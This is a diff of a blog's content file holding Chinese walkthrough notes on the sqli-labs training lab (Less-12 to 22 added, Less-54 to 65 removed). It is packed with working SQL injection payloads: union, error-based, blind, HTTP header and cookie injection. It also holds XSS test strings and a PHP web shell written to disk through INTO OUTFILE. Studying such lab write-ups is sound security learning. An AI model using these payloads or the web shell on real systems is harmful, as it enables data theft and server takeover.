-<p>猜表名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>爆出</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w4xiim6dlu</span><br></pre></td></tr></table></figure>
-<p>让我们看看<br><code>w4xiim6dlu</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;w4xiim6dlu&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>爆出</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secret_8581</span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="number">0x7e</span>,secret_8581,<span class="number">0x7e</span>),<span class="number">3</span> <span class="keyword">from</span> w4xiim6dlu <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>取得数据<br><code>~rfulceyVFxsq51j1yq7kGt8D~</code></p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>构造闭合注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) UNION SELECT DATABASE(),USER() -- sdk </span><br></pre></td></tr></table></figure>
+<p>成功，扔sqlmap</p>
 <hr>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 --+ 正常</span></span><br></pre></td></tr></table></figure>
-<p>剩下的和上一关一样</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;icq1mwfl07&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(0x7e,secret_TVEL,0x7e),3 from icq1mwfl07 --+</span></span><br></pre></td></tr></table></figure>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) UNION SELECT USER(),DATABASE() -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>界面不再回显信息<br>但是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以进行盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) AND LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>返回是错误，检查原因，是因为passwd并不正确，所以使用</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) OR LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
 <hr>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;  --+</span><br></pre></td></tr></table></figure>
-<p>双引号闭合<br>剩下的和上几关一样，不再演示</p>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1111</span>&quot; OR LENGTH(DATABASE())=8 -- SJSN </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
 <hr>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这关只有五次<br>根据爆错可以看到是单引号闭合</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
-<p>没反应，试试报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
-<p>芜湖，成功</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="number">1</span>m0z0tx769<span class="string">&#x27; limit 2,2 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
-<p><code>Subquery returns more than 1 row</code><br>欸草，limit 用错了，要被笑了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>zdim9qe7y5<span class="string">&#x27; LIMIT 2,1 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select concat(secret_QZZ8) from zdim9qe7y5),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
-<p>ok</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>这里不再提示错误的语句只返回slap.jpg</p>
+<p>开始手工fuzzing闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 -- sjjs </span></span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg<br>开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR LENGTH(DATABASE())=8 -- sjjs </span></span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
 <hr>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这题通过报错是数字型注入<br>其余和上题一样</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;rqkli61x10&#x27;</span> LIMIT <span class="number">2</span>,<span class="number">1</span> ),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(secret_V2XX) <span class="keyword">from</span> rqkli61x10),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<p>get<code>~KM85Q1UPRPyyBUCX0iEIl3fy~</code></p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同样开始fuzzing测试闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR 1=1 -- DDD </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg</p>
+<p>开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR LENGTH(DATABASE())=8 -- DDD </span><br></pre></td></tr></table></figure>
+<p>返回flag.jpg，成功</p>
 <hr>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>通过报错信息可知闭合方式为”)，其余操作和上题一样<br>不再记录</p>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这里可以看到是密码更新的一关<br>首先输入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
+<p>返回flag1.jpg是密码更新成功</p>
+<p>输入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; &amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>返回slap1.jpg提示<code>BUG OFF YOU SILLY DUMB HACKER</code><br>输入    </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="string">&#x27; &amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>返回报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</code></p>
+<p>看来是passwd字段存在注入，<br>开始构造报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPATDEXML(1,CONCAT(0X74,(SELECT DATABASE()),0X74),1) -- DJD</span></span><br></pre></td></tr></table></figure>
+<p>爆出错误</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FUNCTION</span> security.UPATDEXML does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure>
+<p>爆出数据库名，成功</p>
 <hr>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>通过报错信息可知闭合方式为’))，其余操作和上题一样<br>不再记录</p>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>首先输入错误的密码，页面依旧显示ip，输入正确的密码后页面显示User Agent<br>发现直接显示user agent尝试xss</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(alert(<span class="regexp">/1/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>弹出页面成功<br>开始测试用户名密码的注入，fuzzing后无结果，既然页面要返回user agent，必定要做处理</p>
+<p>测试user agent字段的闭合方式测试出是单引号</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) -- SHDH </span></span><br></pre></td></tr></table></figure>
+<p>页面依旧正常并没有延时，查阅资料后发现等如下闭合单引号</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>
+<p>成功延时，翻阅源代码后发现</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	$IP <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">			mysql_query($<span class="keyword">insert</span>);</span><br></pre></td></tr></table></figure>
+<p>可见这里对于传入的uname和passwd值做了一个过滤，而对于uagent则没有防护，引起http头注入</p>
 <hr>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>通过测试闭合方式得出是’)闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
-<p>没反应，嗯当然不可能手动盲注啊<br>接下来，掏出我们的sqlmap跑一遍</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.98.133/sqli/Less-62/?id=1&quot; <span class="operator">-</span>D challenges <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-<p>跑了一会，emmm，sqlmap会跑超限制，可以用burp爆破<br>这里不再演示好吧<br>或者直接写shell玩吧</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,&quot;&lt;?php eval($_POST[x]);?&gt;&quot;,3 into outfile &quot;C:\\PHPStudy\\WWW\\sqli\\Less-62\\1.php&quot;--+</span></span><br></pre></td></tr></table></figure>
-<p>我太难了</p>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>根据Less-18的经验很快确定是Referer头的注入，且依旧未对内容进行实体化，造成xss</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: http://192.168.98.133/sqli/Less-19/ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据Less-18的闭合思路</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>闭合成功</p>
+<p>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; OR UPADTAXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功爆出<code>FUNCTION security.UPADTAXML does not exist</code><br>成功</p>
 <hr>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; || sleep(5) --+</span></span><br></pre></td></tr></table></figure>
-<p>接下来盲注跑吧</p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>关卡提示是Cookies注入，首先测试一下，发现会跳转<br>慢慢放包发现</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli/Less-20/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.98.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.98.133/sqli/Less-20/index.php</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+<p>放过后页面提示</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">YOUR IP ADDRESS IS : 192.168.98.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE</span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 30 Aug 2020 - 15:23:53</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:11111</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure>
+<p>又是一堆没有过滤，也能插xss</p>
+<p>我们把注意力放在cookies上<br>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin <span class="string">&#x27; or extractvalue(1,concat(user(),0x7e,database())) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>返回<code>Issue with your mysql: XPATH syntax error: &#39;@localhost~security&#39;</code><br>成功</p>
+<p>接下来试试前一个登录页面是否存在注入，发现突破不了<br>一打开源码，果然，又有过滤。。。。。</p>
 <hr>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>探测闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 错误</span><br></pre></td></tr></table></figure>
-<p>是数字型注入，剩下就是跑盲注</p>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这次果断不测试前面，肯定有过滤直接走后面流程<br>页面中又是熟悉的xss的香味，可惜是x自己<br>看到请求包可以很明显的看到不同</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure>
+<p>通过base64解码可知内容<code>admin</code></p>
+<p>嗯开始构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>加密后<br><code>JyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</code><br>爆出错误<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>成功</p>
+<p>这里再对user agent进行注入，发现失败</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p>这里作者并未进行sql操作，只是直接打印</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>而对于cookee则是进行了查询，且这里的cookee只是简单进行了base64加密，而并未进行过滤操作</p>
 <hr>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>探测注入方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=1 and (&quot;<span class="number">1</span> 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=2 and (&quot;<span class="number">1</span> 错误</span><br></pre></td></tr></table></figure>
-<p>是”)闭合，剩下接盲注跑</p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这里依旧是一个cookies的注入<br>首先根据Less-21的payload直接插</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3DJyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
+<p>失败<br>换个闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p>
 <hr>
-<p>之后的关卡并没有文件，因此，sqli-lab靶场系列笔记结束<br>ok，就这样吧</p>
 ]]></content>
       <categories>
         <category>学习笔记</category>
@@ -677,39 +582,98 @@
       </tags>
   </entry>
   <entry>
-    <title>导入表学习笔记</title>
-    <url>/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="导入表学习笔记"><a href="#导入表学习笔记" class="headerlink" title="导入表学习笔记"></a>导入表学习笔记</h1><hr>
-<h2 id="0x00-导入表概述"><a href="#0x00-导入表概述" class="headerlink" title="0x00 导入表概述"></a>0x00 导入表概述</h2><p>当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。</p>
+    <title>sqli-lab Less 54-Less 65</title>
+    <url>/2020/09/10/sqli-lab-Less-54-Less-65/</url>
+    <content><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-54-Less-65"><a href="#Sqli-lab-过关笔记-Less-54-Less-65" class="headerlink" title="Sqli-lab 过关笔记 Less 54-Less 65"></a>Sqli-lab 过关笔记 Less 54-Less 65</h1><blockquote>
+<p>Start Challenge</p>
+</blockquote>
 <a id="more"></a>
-
-<p>而导入表则是位于IMAGE_DIRECTORY_ENTRY_IMPORT的第2项，而第2项指向的仍是一个数组。</p>
